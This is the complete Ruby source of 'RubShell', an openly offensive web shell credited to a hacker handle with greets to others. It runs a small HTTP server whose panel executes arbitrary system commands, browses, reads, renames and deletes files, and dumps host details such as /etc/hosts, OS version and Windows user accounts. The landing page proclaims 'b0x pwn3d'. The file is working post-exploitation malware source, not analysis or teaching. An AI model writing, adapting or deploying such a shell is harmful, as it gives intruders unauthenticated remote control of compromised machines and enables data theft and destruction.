require 'socket'
require 'cgi'

httpPort   = (ARGV[0] || 8020)
httpServer = TCPServer.new('127.0.0.1', httpPort)

class Integer
	def to_filesize
		{
			'B'  => 1024,
			'KB' => 1024 * 1024,
			'MB' => 1024 * 1024 * 1024,
			'GB' => 1024 * 1024 * 1024 * 1024,
			'TB' => 1024 * 1024 * 1024 * 1024 * 1024
		}.each_pair { |e, s| return "#{(self.to_f / (s / 1024)).round(2)}#{e}" if self < s }
	end
end

def is_binary(path)
	s = File.read(path, 4096) and !s.empty? and (/\0/n =~ s or s.count("\t\n -~").to_f/s.size<=0.7)
end

def readFile(filename)
	contents = File.open(filename, 'rb').read
	return CGI.escapeHTML(contents)
end

loop {

	s = httpServer.accept
	s.print "HTTP/1.1 200/OK\r\n"
	s.print "Content-type: text/html\r\n"
	s.print "\r\n"

	s.print '<!DOCTYPE html><html><head><title>RubShell by Khan</title>'
	# elagant-ify it, pl0x.
	s.print '<style>body {font-family: monospace;} ul {display: inline-block; list-style: none; position: relative; margin: 0; padding: 0;} ul a {display: block; color: black; text-align: center; padding: 14px 16px; text-decoration: none;} ul li a:hover {color: #f78f1e;} ul li {position: relative; float: left; margin: 0; padding: 0;} input[type=text] {width: 20%; padding: 12px 20px; margin: 8px 0; display: inline-block; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;} input[type=submit] {width: 20%; background-color: #f78f1e; color: white; padding: 14px 20px; margin: 8px 0; border: none; border-radius: 4px; cursor: pointer;} input[type=submit]:hover {background-color: #d87c17;} tr:hover {background-color:#d3d3d3;} .val {border: 1px solid black;} #files {border-width: 1px 1px 1px 1px; border-color: black; border-style: solid;} .fileLink {color: black; text-decoration: none;} </style>'
	s.print '</head><body><center><h1>Rubshell</h1><hr>'
	s.print '<ul><li><a href="/?action=home">Home</a></li><li><a href="/?action=files">Files</a><li><a href="/?action=cmd">CMD</a></li></ul><hr>'

	request = s.gets

	if !request.nil?
		request = request.split(' ')
		request = request.fetch(1)
		begin
			if request != '/' && request != '/?'
				getParams = CGI::parse(request.split('/?')[1])
				if getParams.has_key? 'action'
					if getParams['action'][0] == 'home'
						s.print '<br><b>System Information</b><br><br>'

						s.print '<table><tbody>'

						s.print "<tr><td style='color: red'>Ruby Version</td><td>~</td><td style='border: 1px solid black'>#{RUBY_VERSION}</td></tr>"
						if !Gem.win_platform?
							s.print "<tr><td style='color: red'>OS Version</td><td>~</td><td class='val'>#{readFile('/proc/version')}</td></tr>"
							s.print "<tr><td style='color: red'>Distro</td><td>~</td><td class='val'>#{readFile('/etc/issue.net')}</td></tr>"
							s.print "<tr><td style='color: red'>Hosts</td><td>~</td><td class='val'><pre>#{readFile('/etc/hosts')}</pre></td></tr>"
							s.print "<tr><td style='color: red'>HDD Space</td><td>~</td><td class='val'><pre>#{CGI.escapeHTML(`df -H`)}</pre></td></tr>"
						else
							s.print "<tr><td style='color: red'>OS Version</td><td>~</td><td class='val'>#{CGI.escapeHTML(`ver`)}</td></tr>"
							s.print "<tr><td style='color: red'>Account Settings</td><td>~</td><td class='val'>#{CGI.escapeHTML(`net accounts`)}</td></tr>"
							s.print "<tr><td style='color: red'>Admin Accounts</td><td>~</td><td class='val'>##{CGI.escapeHTML(`net user`)}</td></tr>"
						end

						s.print '</tbody></table>'
					elsif getParams['action'][0] == 'files'
						s.print '<br><b>File Manager</b><br><br>'
						if getParams.has_key? 'readFile'
							s.print '<a href="?action=files">Back</a><br><br>'
							s.print '<b>CWD ~ </b>' + Dir.pwd + '<br>'
							s.print '<b>Reading ~ </b>' + CGI.escapeHTML(getParams['readFile'][0]) + '<br><br>'
							if File.readable? getParams['readFile'][0]
								if !is_binary(getParams['readFile'][0])
									s.print "<pre style='text-align: left; border: 1px dashed black;'>#{readFile(getParams['readFile'][0])}</pre>"
								else
									s.print '<span style="color: red">Error</span> ~ File is a binary file!<br>'
								end
							else
								s.print '<span style="color: red">Error</span> ~ File is not readable!<br>'
							end
						elsif getParams.has_key? 'renameFile'
							if getParams.has_key? 'newFilename'
								if File.rename(CGI.escapeHTML(getParams['renameFile'][0]) , CGI.escapeHTML(getParams['newFilename'][0]))
									s.print '<a href="?action=files">Back</a><br><br>File Renamed Successfully!<br>'
								else
									s.print '<a href="?action=files">Back</a><br><br><span style="color: red">Error</span> renaming file!<br>'
								end
							else
								s.print '<a href="?action=files">Back</a><br><br>'
								s.print '<b>Renaming ~ </b>' + Dir.pwd + File::SEPARATOR + CGI.escapeHTML(getParams['renameFile'][0]) + '<br><br>'
								s.print '<form><input type="hidden" name="action" value="files" /><input type="hidden" name="renameFile" value="' + CGI.escapeHTML(getParams['renameFile'][0]) + '" /><input type="text" name="newFilename" placeholder="New Filename" /><br><input type="submit" value=">>" /></form><br>'
							end
						elsif getParams.has_key? 'deleteFile'
							if getParams.has_key? 'confirmed'
								if File.exist?(CGI.escapeHTML(getParams['deleteFile'][0])) and File.delete(CGI.escapeHTML(getParams['deleteFile'][0]))
									s.print '<a href="?action=files">Back</a><br><br>File Deleted Successfully!<br>'
								else
									s.print '<a href="?action=files">Back</a><br><br><span style="color: red">Error</span> deleting file!<br>'
								end
							else
								s.print '<a href="?action=files">Back</a><br><br>'
								s.print '<b>Deleting ~ </b>' + Dir.pwd + File::SEPARATOR + CGI.escapeHTML(getParams['deleteFile'][0]) + '<br><br>'
								s.print '<form><input type="hidden" name="action" value="files" /><input type="hidden" name="deleteFile" value="' + CGI.escapeHTML(getParams['deleteFile'][0]) + '" /><input type="submit" name="confirmed" value=">>" /></form><br>'
							end
						else
							dir = (getParams['dir'][0]) ? (File.directory?(getParams['dir'][0]) ? Dir.chdir(getParams['dir'][0]) : '.') : '.'
														s.print '<b>CWD ~ </b>' + Dir.pwd + '<br><br>'
							s.print '<table width="100%" id="files" cellspacing="0" cellpadding="2"><tbody>'
							s.print '<tr><th>Name</th><th>Size</th><th>Modify</th><th>Permissions</th><th>Action</th></tr>'
														files = Dir.entries(Dir.pwd).sort
							files.shift
							files.each { |file|
								perms    = File.stat(file).mode.to_s(8)[-3..-1]
								size     = File.size(file).to_filesize
								modified = File.mtime(file)
								file     = CGI.escapeHTML(file)
								if File.directory?(file)
									if file == '..'
										s.print "<tr><td colspan='5'><b><a class='fileLink' href='/?action=files&dir=#{file}'>[ #{file} ]</a></b></td></tr>"
									else
										s.print "<tr><td><b><a class='fileLink' href='/?action=files&dir=#{file}'>[ #{file} ]</a></b></td><td>dir</td><td style='text-align: center'>#{modified}</td><td style='text-align: center'>#{perms}</td><td><a class='fileLink' href='/?action=files&renameFile=#{file}'><b>[REN]</b></a></td></tr>"
									end
								else
									s.print "<tr><td><a class='fileLink' href='/?action=files&readFile=#{file}'>#{file}</a></td><td>#{size}</td><td style='text-align: center'>#{modified}</td><td style='text-align: center'>#{perms}</td><td><a class='fileLink' href='/?action=files&renameFile=#{file}'><b>[REN]</b></a> <a class='fileLink' href='/?action=files&deleteFile=#{file}'><b>[DEL]</b></a> </td></tr>"
								end
							}
														s.print '</tbody></table><br><br>'
						end
					elsif getParams['action'][0] == 'cmd'
						s.print '<br><b>Execute System Commands</b><br>'
						s.print '<form><input type="hidden" name="action" value="cmd" /><input type="text" name="command" placeholder="whoami" /><br><input type="submit" value=">>" /></form><br>'
						if getParams.has_key? 'command'
							command = getParams['command'][0]
							s.print '<br><b>Output ~</b>'
							s.print '<pre style="text-align: left">' + `#{command}` + '</pre>'
						end
					end   
				end
			else
				s.print '<br><video autoplay loop="loop" src="http://lolwaleet.com/cheers.mp4"></video><h2 style="font-family: \'Comic Sans MS\';">b0x pwn3d - habe phun</h2><br>'
			end
		rescue Exception; end
	end
	s.print '<hr>Coded by <span style="color: red">AnonGuy</span><br>Greets ~ <span style="color: blue">T3N38R15</span> - <span style="color: blue">MakMan</span> - <span style="color: blue">Maini</span> - <span style="color: blue">Mohit</span></center><hr></body></html>'
	s.close
}
